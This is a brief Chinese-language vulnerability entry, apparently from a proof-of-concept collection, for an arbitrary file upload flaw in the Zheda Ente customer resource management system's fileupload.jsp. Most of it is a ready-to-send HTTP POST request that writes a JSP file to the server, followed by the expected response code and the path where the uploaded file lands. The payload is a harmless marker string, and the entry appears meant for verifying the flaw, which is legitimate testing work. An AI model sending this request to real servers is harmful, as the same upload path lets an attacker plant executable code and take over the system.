﻿# 浙大恩特客户资源管理系统 fileupload.jsp 任意文件上传

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /entsoft_en/entereditor/jsp/fileupload.jsp?filename=dudesuite.jsp HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Connection: close
Accept-Encoding: gzip, deflate

dudesuite
```

> 响应代码特征：200

> 响应内容特征：dudesuite.jsp

> 上传文件定位：/enterdoc/uploadfile/dudesuite.jsp

> 验证文件来源：浙大恩特客户资源管理系统 fileupload.jsp 任意文件上传.poc
